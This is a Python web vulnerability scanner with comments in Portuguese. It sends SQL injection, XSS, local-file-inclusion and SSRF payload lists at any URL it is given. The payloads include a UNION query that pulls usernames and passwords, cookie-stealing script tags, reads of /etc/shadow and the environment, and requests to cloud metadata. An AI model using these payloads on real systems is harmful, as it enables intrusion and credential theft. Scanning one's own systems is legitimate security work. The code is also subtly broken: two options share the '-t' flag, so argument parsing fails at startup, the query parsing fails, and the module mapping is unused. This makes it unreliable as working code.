"""
VulnScanner — Modo 4070 APEX
Scanner de vulnerabilidades backend com múltiplos módulos.
Testa: SQLi, XSS, LFI, SSRF, RCE, Header Injection, Info Disclosure.
"""

import sys
import os
import json
import time
import re
import hashlib
import asyncio
import aiohttp
from pathlib import Path
from typing import Dict, List, Optional, Any, Set
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from urllib.parse import quote, unquote, urlparse, urljoin


# =========================================================================
# Constants
# =========================================================================

class Severity(Enum):
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"


class VulnType(Enum):
    SQLI = "sqli"
    XSS = "xss"
    LFI = "lfi"
    SSRF = "ssrf"
    RCE = "rce"
    HEADER_INJECTION = "header_injection"
    INFO_DISCLOSURE = "info_disclosure"
    CSRF = "csrf"
    AUTH_BYPASS = "auth_bypass"
    DEFAULT_CREDENTIALS = "default_credentials"
    misconfiguration = "misconfiguration"


@dataclass
class Finding:
    vuln_type: VulnType
    severity: Severity
    title: str
    description: str
    endpoint: str
    parameter: Optional[str]
    evidence: str
    remediation: str
    cve: Optional[str] = None
    cvss: Optional[float] = None
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            "type": self.vuln_type.value,
            "severity": self.severity.value,
            "title": self.title,
            "description": self.description[:500],
            "endpoint": self.endpoint,
            "parameter": self.parameter,
            "evidence": self.evidence[:300],
            "remediation": self.remediation,
            "cve": self.cve,
            "cvss": self.cvss,
        }


@dataclass
class ScanResult:
    target: str
    start_time: datetime
    end_time: Optional[datetime] = None
    findings: List[Finding] = field(default_factory=list)
    stats: Dict[str, Any] = field(default_factory=dict)
    
    def add_finding(self, finding: Finding):
        self.findings.append(finding)
    
    def get_summary(self) -> Dict[str, Any]:
        severity_counts = {}
        for f in self.findings:
            severity_counts[f.severity.value] = severity_counts.get(f.severity.value, 0) + 1
        
        return {
            "target": self.target,
            "duration_ms": (self.end_time - self.start_time).total_seconds() * 1000 if self.end_time else 0,
            "total_findings": len(self.findings),
            "by_severity": severity_counts,
            "findings": [f.to_dict() for f in self.findings],
        }


# =========================================================================
# Base Scanner Module
# =========================================================================

class ScannerModule:
    """Base class for vulnerability scanner modules."""
    
    name: str = "base"
    description: str = ""
    enabled: bool = True
    
    async def scan(self, target: str, session: aiohttp.ClientSession, 
                   options: Dict[str, Any]) -> List[Finding]:
        raise NotImplementedError


# =========================================================================
# SQLi Scanner
# =========================================================================

class SQLiScanner(ScannerModule):
    """SQL Injection scanner."""
    
    name = "sqli"
    description = "Testa injeção SQL em parâmetros e headers"
    
    PAYLOADS = [
        # Error-based
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR 1=1 --",
        "1' ORDER BY 1--",
        "1' ORDER BY 2--",
        "1' ORDER BY 3--",
        "' UNION SELECT NULL--",
        "' UNION SELECT 1--",
        "' UNION SELECT 1,2--",
        "' UNION SELECT 1,2,3--",
        # Time-based
        "WAITFOR DELAY '0:0:5'--",
        "SLEEP(5)",
        "BENCHMARK(10000000,MD5('test'))",
        # Boolean-based
        "' AND '1'='1",
        "' AND '1'='2",
        "1 AND 1=1",
        "1 AND 1=2",
        # Union-based
        "' UNION SELECT username,password FROM users--",
        "' UNION SELECT table_name,NULL FROM information_schema.tables--",
        "' UNION SELECT column_name,NULL FROM information_schema.columns--",
    ]
    
    ERROR_PATTERNS = [
        r"SQL syntax.*?MySQL",
        r"Warning.*?mysqli?",
        r"Oracle error",
        r"Microsoft SQL Server",
        r"DB2 error",
        r"SQLite error",
        r"PostgreSQL error",
        r"ODBC drivers",
        r"quoted string",
        r"SQL server",
        r"mysql_fetch",
        r"pg_query",
        r"Syntax error",
        r"unclosed quotation",
        r"SQL injection",
    ]
    
    async def scan(self, target: str, session: aiohttp.ClientSession,
                   options: Dict[str, Any]) -> List[Finding]:
        findings = []
        
        # Parse target
        parsed = urlparse(target)
        base_url = f"{parsed.scheme}://{parsed.netloc}"
        
        # Get pages to test
        pages = await self._discover_pages(base_url, session, options)
        
        # Test each page
        for page in pages:  # Limit for speed
            page_findings = await self._test_page(page, session, options)
            findings.extend(page_findings)
        
        return findings
    
    async def _discover_pages(self, base_url: str, session: aiohttp.ClientSession,
                               options: Dict) -> List[str]:
        """Discover pages to test."""
        pages = [base_url]
        
        # Test common endpoints
        common_paths = [
            "/login", "/signin", "/auth", "/api", "/admin",
            "/search", "/query", "/get", "/post", "/data",
            "/user", "/account", "/profile", "/settings",
        ]
        
        for path in common_paths:
            url = urljoin(base_url, path)
            pages.append(url)
        
        return pages
    
    async def _test_page(self, url: str, session: aiohttp.ClientSession,
                         options: Dict) -> List[Finding]:
        """Test a single page for SQLi."""
        findings = []
        
        parsed = urlparse(url)
        params = dict(parsed.query.split('&')) if parsed.query else {}
        
        # Test URL parameters
        for param in list(params.keys()):
            for payload in self.PAYLOADS:  # Limit payloads per param
                test_url = url.replace(f"{param}={params[param]}", f"{param}={quote(payload)}")
                finding = await self._check_response(test_url, session, param, options)
                if finding:
                    findings.append(finding)
        
        # Test common injection points
        test_urls = [
            f"{url}?id=1' OR '1'='1",
            f"{url}?id=1 AND 1=1",
            f"{url}?id=1 AND 1=2",
            f"{url}?search=test' UNION SELECT 1--",
        ]
        
        for test_url in test_urls:
            finding = await self._check_response(test_url, session, "query_param", options)
            if finding:
                findings.append(finding)
        
        return findings
    
    async def _check_response(self, url: str, session: aiohttp.ClientSession,
                              param: str, options: Dict) -> Optional[Finding]:
        """Check response for SQLi indicators."""
        try:
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=60)) as resp:
                content = await resp.text()
                status = resp.status
                
                # Check for error patterns
                for pattern in self.ERROR_PATTERNS:
                    if re.search(pattern, content, re.IGNORECASE):
                        return Finding(
                            vuln_type=VulnType.SQLI,
                            severity=Severity.HIGH,
                            title=f"Potential SQL Injection in {param}",
                            description=f"SQL error pattern detected in response. Pattern: {pattern}",
                            endpoint=url,
                            parameter=param,
                            evidence=content[:500],
                            remediation="Use parameterized queries. Validate and sanitize all input.",
                        )
                
                # Check for time-based responses
                # (Would need timing analysis in real implementation)
                
        except Exception as e:
            pass
        
        return None


# =========================================================================
# XSS Scanner
# =========================================================================

class XSSScanner(ScannerModule):
    """Cross-Site Scripting scanner."""
    
    name = "xss"
    description = "Testa XSS reflecionado e DOM-based"
    
    PAYLOADS = [
        # Reflected XSS
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>",
        "<iframe src='javascript:alert(1)'>",
        "'><script>alert(document.cookie)</script>",
        '<img src="x" onerror="alert(1)">',
        # Advanced
        "<body onload=alert(1)>",
        "<input onfocus=alert(1) autofocus>",
        "<details ontoggle=alert(1)>",
        "<marquee onstart=alert(1)>",
        "<video><source onerror=alert(1)>",
        "<audio src=x onerror=alert(1)>",
        # Event handlers
        "javascript:alert(1)",
        "vbscript:MsgBox(1)",
    ]
    
    async def scan(self, target: str, session: aiohttp.ClientSession,
                   options: Dict[str, Any]) -> List[Finding]:
        findings = []
        parsed = urlparse(target)
        base_url = f"{parsed.scheme}://{parsed.netloc}"
        
        # Test common injection points
        test_points = [
            base_url,
            f"{base_url}/search?q=",
            f"{base_url}/page?title=",
            f"{base_url}/item?id=",
            f"{base_url}/product?name=",
        ]
        
        for url in test_points:
            for payload in self.PAYLOADS:
                test_url = f"{url}{quote(payload)}"
                finding = await self._check_xss(test_url, session, options)
                if finding:
                    findings.append(finding)
        
        # Test headers
        finding = await self._test_headers(base_url, session, options)
        if finding:
            findings.append(finding)
        
        return findings
    
    async def _check_xss(self, url: str, session: aiohttp.ClientSession,
                         options: Dict) -> Optional[Finding]:
        """Check for reflected XSS."""
        try:
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=60)) as resp:
                content = await resp.text()
                
                # Check if payload is reflected
                for payload in self.PAYLOADS:
                    if payload in content and f"q={quote(payload)}" in url:
                        return Finding(
                            vuln_type=VulnType.XSS,
                            severity=Severity.HIGH,
                            title="Reflected XSS Detected",
                            description=f"Payload reflected in response: {payload[:50]}...",
                            endpoint=url,
                            parameter="query",
                            evidence=f"Payload found in response body",
                            remediation="Encode output. Use Content-Security-Policy header.",
                        )
        except Exception:
            pass
        return None
    
    async def _test_headers(self, base_url: str, session: aiohttp.ClientSession,
                           options: Dict) -> Optional[Finding]:
        """Test for XSS via headers."""
        test_headers = {
            "X-Reflected": "<script>alert(1)</script>",
            "Referer": "<script>alert(1)</script>",
        }
        
        try:
            async with session.get(base_url, headers=test_headers, 
                                  timeout=aiohttp.ClientTimeout(total=60)) as resp:
                content = await resp.text()
                
                for header, value in test_headers.items():
                    if value in content:
                        return Finding(
                            vuln_type=VulnType.XSS,
                            severity=Severity.MEDIUM,
                            title=f"XSS via {header} header",
                            description=f"Header value reflected in response",
                            endpoint=base_url,
                            parameter=header,
                            evidence=f"Header {header} reflected",
                            remediation="Sanitize header values before reflecting.",
                        )
        except Exception:
            pass
        return None


# =========================================================================
# LFI Scanner
# =========================================================================

class LFIScanner(ScannerModule):
    """Local File Inclusion scanner."""
    
    name = "lfi"
    description = "Testa inclusão de arquivos locais"
    
    PAYLOADS = [
        "/etc/passwd",
        "/etc/shadow",
        "c:\\windows\\system32\\drivers\\etc\\hosts",
        "..\\..\\..\\etc\\passwd",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "/proc/self/environ",
        "/proc/version",
        "php://filter/convert.base64-encode/resource=index.php",
        "php://input",
        "expect://id",
    ]
    
    async def scan(self, target: str, session: aiohttp.ClientSession,
                   options: Dict[str, Any]) -> List[Finding]:
        findings = []
        parsed = urlparse(target)
        base_url = f"{parsed.scheme}://{parsed.netloc}"
        
        # Test file inclusion parameters
        test_params = ["file", "page", "include", "path", "folder", "dir", "template"]
        
        for param in test_params:
            for payload in self.PAYLOADS:
                test_url = f"{base_url}/?{param}={quote(payload)}"
                finding = await self._check_lfi(test_url, session, param, options)
                if finding:
                    findings.append(finding)
        
        return findings
    
    async def _check_lfi(self, url: str, session: aiohttp.ClientSession,
                        param: str, options: Dict) -> Optional[Finding]:
        """Check for LFI."""
        try:
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=60)) as resp:
                content = await resp.text()
                status = resp.status
                
                # Check for successful file inclusion
                if "root:" in content and "x:" in content:  # /etc/passwd pattern
                    return Finding(
                        vuln_type=VulnType.LFI,
                        severity=Severity.CRITICAL,
                        title=f"Local File Inclusion via {param}",
                        description="Successful file inclusion detected",
                        endpoint=url,
                        parameter=param,
                        evidence=content[:300],
                        remediation="Validate file paths. Use whitelist for allowed files.",
                    )
                
                # Check for PHP source disclosure
                if "<?php" in content and "index.php" in url:
                    return Finding(
                        vuln_type=VulnType.LFI,
                        severity=Severity.CRITICAL,
                        title=f"PHP Source Disclosure via {param}",
                        description="PHP source code exposed",
                        endpoint=url,
                        parameter=param,
                        evidence="PHP source code found in response",
                        remediation="Configure PHP handler correctly. Disable auto_prepend_file.",
                    )
                    
        except Exception:
            pass
        return None


# =========================================================================
# SSRF Scanner
# =========================================================================

class SSRFScanner(ScannerModule):
    """Server-Side Request Forgery scanner."""
    
    name = "ssrf"
    description = "Testa request forgery do lado do servidor"
    
    PAYLOADS = [
        "http://127.0.0.1",
        "http://localhost",
        "http://169.254.169.254/latest/meta-data/",
        "http://[::1]",
        "http://0.0.0.0",
        "gopher://127.0.0.1:6379/",
        "file:///etc/passwd",
        "dict://127.0.0.1:11211/",
    ]
    
    async def scan(self, target: str, session: aiohttp.ClientSession,
                   options: Dict[str, Any]) -> List[Finding]:
        findings = []
        parsed = urlparse(target)
        base_url = f"{parsed.scheme}://{parsed.netloc}"
        
        # Test URL parameters that might be used for SSRF
        test_params = ["url", "link", "redirect", "next", "destination", "domain", "path"]
        
        for param in test_params:
            for payload in self.PAYLOADS[:3]:
                test_url = f"{base_url}/?{param}={quote(payload)}"
                finding = await self._check_ssrf(test_url, session, param, options)
                if finding:
                    findings.append(finding)
        
        return findings
    
    async def _check_ssrf(self, url: str, session: aiohttp.ClientSession,
                         param: str, options: Dict) -> Optional[Finding]:
        """Check for SSRF."""
        try:
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=60)) as resp:
                content = await resp.text()
                status = resp.status
                
                # Check for internal service responses
                if "Meta-data" in content or "ami-id" in content:
                    return Finding(
                        vuln_type=VulnType.SSRF,
                        severity=Severity.CRITICAL,
                        title=f"SSRF to Cloud Metadata via {param}",
                        description="Access to cloud metadata endpoint detected",
                        endpoint=url,
                        parameter=param,
                        evidence=content[:300],
                        remediation="Validate URLs. Block internal IP ranges. Use allowlist.",
                    )
                
                if "root:" in content and "x:" in content:
                    return Finding(
                        vuln_type=VulnType.SSRF,
                        severity=Severity.HIGH,
                        title=f"SSRF to Local File via {param}",
                        description="Local file access via SSRF",
                        endpoint=url,
                        parameter=param,
                        evidence="Local file content found",
                        remediation="Validate URLs. Block file:// protocol.",
                    )
                    
        except aiohttp.ClientError as e:
            # Connection refused to internal services might indicate SSRF
            if "127.0.0.1" in url or "localhost" in url:
                return Finding(
                    vuln_type=VulnType.SSRF,
                    severity=Severity.MEDIUM,
                    title=f"Potential SSRF via {param}",
                    description="Request to internal address was attempted",
                    endpoint=url,
                    parameter=param,
                    evidence=str(e),
                    remediation="Validate and sanitize all URL inputs.",
                )
        except Exception:
            pass
        return None


# =========================================================================
# Info Disclosure Scanner
# =========================================================================

class InfoDisclosureScanner(ScannerModule):
    """Information disclosure scanner."""
    
    name = "info_disclosure"
    description = "Testa vazamento de informações sensíveis"
    
    async def scan(self, target: str, session: aiohttp.ClientSession,
                   options: Dict[str, Any]) -> List[Finding]:
        findings = []
        parsed = urlparse(target)
        base_url = f"{parsed.scheme}://{parsed.netloc}"
        
        # Check security headers
        finding = await self._check_security_headers(base_url, session)
        if finding:
            findings.append(finding)
        
        # Check common info disclosure paths
        paths_to_test = [
            "/.git/config",
            "/.env",
            "/wp-config.php",
            "/config.php",
            "/admin.php",
            "/phpinfo.php",
            "/server-status",
            "/server-info",
            "/.svn/entries",
            "/backup.sql",
            "/db.sql",
            "/debug",
            "/trace",
            "/actuator",
            "/actuator/env",
            "/actuator/health",
            "/swagger-ui.html",
            "/api-docs",
            "/graphql",
        ]
        
        for path in paths_to_test:
            finding = await self._check_path(f"{base_url}{path}", session)
            if finding:
                findings.append(finding)
        
        return findings
    
    async def _check_security_headers(self, url: str, session: aiohttp.ClientSession) -> Optional[Finding]:
        """Check for missing security headers."""
        try:
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                headers = dict(resp.headers)
                
                missing = []
                recommended = [
                    "X-Content-Type-Options",
                    "X-Frame-Options",
                    "Strict-Transport-Security",
                    "Content-Security-Policy",
                    "X-XSS-Protection",
                    "Referrer-Policy",
                    "Permissions-Policy",
                ]
                
                for header in recommended:
                    if header.lower() not in headers:
                        missing.append(header)
                
                if missing:
                    return Finding(
                        vuln_type=VulnType.INFO_DISCLOSURE,
                        severity=Severity.LOW,
                        title="Missing Security Headers",
                        description=f"Missing headers: {', '.join(missing[:5])}",
                        endpoint=url,
                        parameter=None,
                        evidence=f"Missing: {', '.join(missing)}",
                        remediation="Add security headers to all responses.",
                    )
        except Exception:
            pass
        return None
    
    async def _check_path(self, url: str, session: aiohttp.ClientSession) -> Optional[Finding]:
        """Check for information disclosure paths."""
        try:
            async with session.head(url, timeout=aiohttp.ClientTimeout(total=10),
                                   allow_redirects=False) as resp:
                status = resp.status
                headers = dict(resp.headers)
                
                # Git config
                if "/.git" in url and status == 200:
                    return Finding(
                        vuln_type=VulnType.INFO_DISCLOSURE,
                        severity=Severity.HIGH,
                        title="Git Repository Exposed",
                        description=".git directory is accessible",
                        endpoint=url,
                        parameter=None,
                        evidence=f"Status: {status}",
                        remediation="Block access to .git directories.",
                    )
                
                # Environment files
                if "/.env" in url and status == 200:
                    return Finding(
                        vuln_type=VulnType.INFO_DISCLOSURE,
                        severity=Severity.CRITICAL,
                        title="Environment File Exposed",
                        description=".env file accessible (may contain secrets)",
                        endpoint=url,
                        parameter=None,
                        evidence=f"Status: {status}",
                        remediation="Block access to .env files.",
                    )
                
                # PHP info
                if "/phpinfo" in url.lower() and status == 200:
                    return Finding(
                        vuln_type=VulnType.INFO_DISCLOSURE,
                        severity=Severity.MEDIUM,
                        title="PHPInfo Exposed",
                        description="phpinfo() page accessible",
                        endpoint=url,
                        parameter=None,
                        evidence=f"Status: {status}",
                        remediation="Remove or block phpinfo pages.",
                    )
                
                # Actuator endpoints
                if "/actuator" in url and status == 200:
                    return Finding(
                        vuln_type=VulnType.INFO_DISCLOSURE,
                        severity=Severity.HIGH,
                        title="Spring Actuator Exposed",
                        description="Spring Boot actuator endpoints accessible",
                        endpoint=url,
                        parameter=None,
                        evidence=f"Status: {status}",
                        remediation="Secure actuator endpoints. Disable sensitive endpoints.",
                    )
                    
        except Exception:
            pass
        return None


# =========================================================================
# Main Scanner Engine
# =========================================================================

class VulnScanner:
    """
    VulnScanner — Modo 4070 APEX
    Scanner de vulnerabilidades backend completo.
    """
    
    def __init__(self, concurrency: int = 20, timeout: int = 60):
        self.concurrency = concurrency
        self.timeout = timeout
        self.modules: List[ScannerModule] = [
            SQLiScanner(),
            XSSScanner(),
            LFIScanner(),
            SSRFScanner(),
            InfoDisclosureScanner(),
        ]
        self.results: Optional[ScanResult] = None
    
    async def scan(self, target: str, options: Optional[Dict] = None) -> ScanResult:
        """Execute full vulnerability scan."""
        options = options or {}
        self.results = ScanResult(
            target=target,
            start_time=datetime.now(),
        )
        
        # Initialize session
        connector = aiohttp.TCPConnector(limit=self.concurrency)
        async with aiohttp.ClientSession(connector=connector) as session:
            # Run each module
            for module in self.modules:
                if not module.enabled:
                    continue
                
                print(f"[VulnScanner] Running {module.name}...")
                try:
                    findings = await module.scan(target, session, options)
                    for finding in findings:
                        self.results.add_finding(finding)
                        print(f"  [!] {finding.severity.value.upper()}: {finding.title}")
                except Exception as e:
                    print(f"  [ERROR] {module.name}: {e}")
        
        self.results.end_time = datetime.now()
        self.results.stats = {
            "modules_run": len([m for m in self.modules if m.enabled]),
            "concurrency": self.concurrency,
            "timeout": self.timeout,
        }
        
        return self.results
    
    def get_report(self, format: str = "json") -> str:
        """Generate report."""
        if not self.results:
            return json.dumps({"error": "No scan results"}, indent=2)
        
        summary = self.results.get_summary()
        
        if format == "json":
            return json.dumps(summary, indent=2)
        elif format == "txt":
            lines = []
            lines.append(f"Vulnerability Scan Report")
            lines.append(f"Target: {self.results.target}")
            lines.append(f"Duration: {summary['duration_ms']:.0f}ms")
            lines.append(f"Total Findings: {summary['total_findings']}")
            lines.append("")
            lines.append("By Severity:")
            for sev, count in summary['by_severity'].items():
                lines.append(f"  {sev.upper()}: {count}")
            lines.append("")
            lines.append("Findings:")
            for f in summary['findings']:
                lines.append(f"  [{f['severity'].upper()}] {f['title']}")
                lines.append(f"    Type: {f['type']}")
                lines.append(f"    Endpoint: {f['endpoint']}")
                lines.append("")
            return "\n".join(lines)
        
        return json.dumps(summary, indent=2)
    
    def save_report(self, filename: str, format: str = "json"):
        """Save report to file."""
        report = self.get_report(format)
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(report)
        print(f"Report saved to: {filename}")


# =========================================================================
# CLI Interface
# =========================================================================

async def main():
    import argparse
    
    parser = argparse.ArgumentParser(
        description='VulnScanner — Modo 4070 APEX',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python vuln_scanner.py https://example.com
  python vuln_scanner.py https://example.com --modules sqli xss
  python vuln_scanner.py https://example.com --output report.json
  python vuln_scanner.py https://example.com --quick
        """
    )
    
    parser.add_argument('target', help='Target URL to scan')
    parser.add_argument('--modules', '-m', nargs='+', 
                       choices=['sqli', 'xss', 'lfi', 'ssrf', 'info'],
                       help='Modules to run')
    parser.add_argument('--concurrency', '-c', type=int, default=5,
                       help='Number of concurrent requests')
    parser.add_argument('--timeout', '-t', type=int, default=30,
                       help='Request timeout in seconds')
    parser.add_argument('--output', '-o', help='Output file')
    parser.add_argument('--format', '-f', choices=['json', 'txt'], default='json',
                       help='Output format')
    parser.add_argument('--quick', '-q', action='store_true',
                       help='Quick scan (limited tests)')
    parser.add_argument('--tokens', '-t', nargs='*', help='JWT tokens to test')
    parser.add_argument('--json', action='store_true', help='JSON output')
    
    args = parser.parse_args()
    
    options = {}
    if args.tokens:
        options["tokens"] = args.tokens
    
    # Initialize scanner
    scanner = VulnScanner(concurrency=args.concurrency, timeout=args.timeout)
    
    # Disable modules if specified
    if args.modules:
        module_map = {
            'sqli': 'sqli',
            'xss': 'xss',
            'lfi': 'lfi',
            'ssrf': 'ssrf',
            'info': 'info_disclosure',
        }
        for m in scanner.modules:
            m.enabled = m.name in args.modules
    
    if args.quick:
        # Quick scan - only info disclosure and basic checks
        for m in scanner.modules:
            if m.name not in ['info_disclosure']:
                m.enabled = False
    
    print(f"[*] Starting scan: {args.target}")
    print(f"[*] Modules: {[m.name for m in scanner.modules if m.enabled]}")
    print()
    
    # Run scan
    results = await scanner.scan(args.target, options=options)
    
    # Output
    if args.json or args.format == 'json':
        print(scanner.get_report('json'))
    else:
        print(scanner.get_report('txt'))
    
    # Save
    if args.output:
        scanner.save_report(args.output, args.format)
    
    # Summary
    summary = results.get_summary()
    print(f"\n=== Summary ===")
    print(f"Total findings: {summary['total_findings']}")
    for sev, count in summary['by_severity'].items():
        print(f"  {sev.upper()}: {count}")


if __name__ == '__main__':
    asyncio.run(main())
